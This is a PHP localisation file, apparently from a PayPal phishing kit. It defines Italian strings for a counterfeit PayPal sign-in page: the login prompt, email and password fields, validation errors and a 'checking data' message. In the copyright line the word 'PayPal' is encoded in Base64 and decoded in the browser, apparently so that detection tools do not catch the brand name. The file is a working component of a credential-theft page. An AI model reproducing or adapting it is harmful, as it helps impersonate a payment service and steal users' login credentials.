<?php
$Z118_01 = "Accedi al tuo conto PayPal";
$Z118_02 = "Indirizzo email";
$Z118_03 = "Password";
$Z118_04 = "L'indirizzo email è obbligatorio";
$Z118_05 = "La password è obbligatoria.";
$Z118_06 = "Accedi";
$Z118_07 = "Hai dimenticato l'indirizzo email o la password?";
$Z118_08 = "Registrati";
$Z118_09 = "Privacy";
$Z118_10 = "PayPal";
$Z118_11 = "Copyright © 1999-<script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. Tutti i diritti riservati.";
$Z118_12 = "Controllo dati…";
$Z118_13 = "Alcune delle tue informazioni non è corretto. Riprova.";
?>
